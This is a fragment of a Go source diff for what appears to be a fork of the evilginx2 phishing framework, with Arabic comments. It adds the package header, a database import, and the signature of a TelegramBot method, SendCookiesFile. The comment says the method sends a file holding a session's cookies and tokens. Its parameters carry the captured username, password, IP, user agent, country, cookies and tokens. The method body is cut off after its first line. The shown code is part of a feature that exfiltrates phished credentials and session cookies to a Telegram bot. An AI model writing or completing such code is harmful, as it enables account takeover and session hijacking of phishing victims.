@@ -1,3 +1,11 @@
+package core
+
+import (
+	"github.com/kgretzky/evilginx2/database"
+)
+
+// تعريفات الهياكل والدوال الأخرى
+
 // SendCookiesFile ترسل ملفًا يحتوي على الكوكيز والتوكنات الخاصة بجلسة ما
 func (t *TelegramBot) SendCookiesFile(sessionID string, name string, username string, password string, remoteAddr string, userAgent string, country string, countryCode string, cookieTokens map[string]map[string]*database.CookieToken, bodyTokens map[string]string, httpTokens map[string]string) error {
 	if !t.Enabled {
